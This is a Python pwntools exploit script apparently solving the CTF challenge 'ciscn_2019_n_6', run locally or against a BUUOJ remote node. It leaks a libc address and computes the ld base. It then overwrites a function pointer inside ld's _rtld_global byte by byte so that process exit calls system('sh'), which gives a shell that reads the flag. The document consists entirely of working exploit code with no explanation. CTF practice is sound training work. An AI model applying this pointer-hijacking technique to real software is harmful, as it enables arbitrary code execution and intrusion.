import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_n_6')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_n_6')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
		else :
			io=remote('node3.buuoj.cn',28925)
			elf=ELF('./ciscn_2019_n_6')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')

		#sys_off=0x000000000004520F
		sys_off=0x10a38c

		io.recvuntil("it ")
		stdout_addr=int(io.recv(14),16)
		print "stdout_addr="+hex(stdout_addr)

		print hex(libc.symbols["_IO_2_1_stdout_"])

		libc.address=stdout_addr-libc.symbols["_IO_2_1_stdout_"]
		ld.address=libc.address+0x3F1000
		sys_addr=libc.sym['system']
		print "libc_address="+hex(libc.address)
		print "system addr="+hex(sys_addr)



		io.recvuntil("\n")
		io.send(p64(ld.symbols["_rtld_global"]+3840))
		io.send(p64(sys_addr)[0])
		io.send(p64(ld.symbols["_rtld_global"]+3840+1))
		io.send(p64(sys_addr)[1])
		io.send(p64(ld.symbols["_rtld_global"]+3840+2))
		io.send(p64(sys_addr)[2])
		io.send(p64(ld.symbols["_rtld_global"]+2312))
		io.send('s')
		io.send(p64(ld.symbols["_rtld_global"]+2312+1))
		# gdb.attach(io,'b *(_dl_fini+105)')
		io.send('h')
		io.sendline('cat flag 1>&0')
		# io.recv()
		pause()
			


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue